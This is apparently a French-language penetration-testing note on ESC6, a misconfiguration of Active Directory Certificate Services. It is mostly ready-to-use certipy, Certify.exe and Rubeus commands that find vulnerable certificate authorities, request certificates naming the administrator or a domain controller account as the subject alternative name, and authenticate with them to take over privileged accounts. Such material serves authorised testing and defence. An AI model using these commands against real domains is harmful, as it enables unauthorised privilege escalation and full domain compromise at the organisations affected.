### Description

ESC6 exploite la vulnérabilité `EDITF_ATTRIBUTESUBJECTALTNAME2` dans la configuration de l'autorité de certification, permettant à un utilisateur de spécifier un Subject Alternative Name (SAN) arbitraire dans n'importe quelle demande de certificat, même si le modèle ne l'autorise normalement pas.

### Conditions vulnérables

Une CA est vulnérable à ESC6 si :

1. **Flag EDITF_ATTRIBUTESUBJECTALTNAME2 activé** - La CA est configurée avec ce flag (valeur 0x40000)
2. **Template avec authentification** - Un modèle permet l'authentification (`Client Authentication` ou `Smart Card Logon`)
3. **Enrollment autorisé** - L'utilisateur a les droits `Enroll` sur le modèle
4. **Pas de protection Manager Approval** - Le modèle n'exige pas d'approbation manuelle

---

### Exploitation depuis linux (certipy)

Enumération des CAs vulnérables :

```bash
certipy find -u user@domain.local -p password -target dc01.domain.local

# Énumération avec sortie JSON pour analyse des configurations CA
certipy find -u user@domain.local -p password -target dc01.domain.local -json -output ca_config.json 

# Recherche spécifique du flag EDITF_ATTRIBUTESUBJECTALTNAME2
certipy find -u user@domain.local -p password -target dc01.domain.local -vulnerable | grep -A5 -B5 "EDITF_ATTRIBUTESUBJECTALTNAME2"
```

Exploitation avec SAN arbitraire :

```bash
# Demande d'un certificat avec SAN administrateur sur un template standard
certipy req -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA' -template 'User' -upn administrator@domain.local

# Avec un template Workstation/Computer
certipy req -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA' -template 'Machine' -upn 'DC01$@domain.local'
```

Authentification avec le certificat obtenu :

```bash
# Authentification en tant qu'administrateur
certipy auth -pfx administrator.pfx -username administrator -domain domain.local -dc-ip 192.168.1.10

# Authentification en tant que compte machine
certipy auth -pfx 'dc01$.pfx' -username 'DC01$' -domain domain.local -dc-ip 192.168.1.10
```

---

### Exploitation depuis windows (certify.exe)

Enumération des CAs vulnérables :

```powershell
# Énumération des modèles et CAs vulnérables 
Certify.exe find /vulnerable 

# Vérification spécifique du flag sur la CA
Certify.exe find /vulnerable | findstr "EDITF_ATTRIBUTESUBJECTALTNAME2"

# Vérification manuelle via certutil
certutil -getreg CA\EditFlags
```

Exploitation avec SAN arbitraire :

```powershell
# Demande d'un certificat User avec SAN administrateur
Certify.exe request /ca:DC01.domain.local\domain-DC01-CA /template:User /altname:administrator@domain.local

# Demande avec template Machine pour obtenir un certificat de compte machine
Certify.exe request /ca:DC01.domain.local\domain-DC01-CA /template:Machine /altname:DC01$@domain.local
```

Authentification avec le certificat obtenu :

```powershell
# Conversion du certificat si nécessaire
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx 

# Authentification avec le certificat 
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:password123 /ptt

# Pour un compte machine
Rubeus.exe asktgt /user:DC01$ /certificate:dc01.pfx /password:password123 /ptt
```
